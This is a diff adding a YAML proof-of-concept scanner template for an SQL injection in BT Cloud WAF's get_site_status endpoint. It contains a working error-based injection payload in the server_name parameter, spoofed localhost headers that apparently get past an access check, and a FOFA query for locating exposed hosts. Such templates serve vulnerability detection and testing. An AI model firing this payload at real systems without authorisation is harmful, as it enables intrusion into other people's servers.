@@ -1,0 +1,20 @@
+id: poc-yaml-bt-waf-get-site-status-sqli
+info:
+  name: 堡塔云WAF get_site_status SQL注入问漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 堡塔云WAF
+  fofa: body="堡塔云WAF"
+variables:
+  t1: random_int(1000,9999)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /get_site_status?server_name='-extractvalue(1,concat(0x5c,md5({{.t1}})))-'
+  headers:
+    X-Forwarded-For: 127.0.0.1
+    Host: 127.0.0.251
+  expression: "status_code == 200 && \ncontains(headers,\"application/json\") && \n\
+    contains(body,substr(t2,0,31))\n"
+transport: http
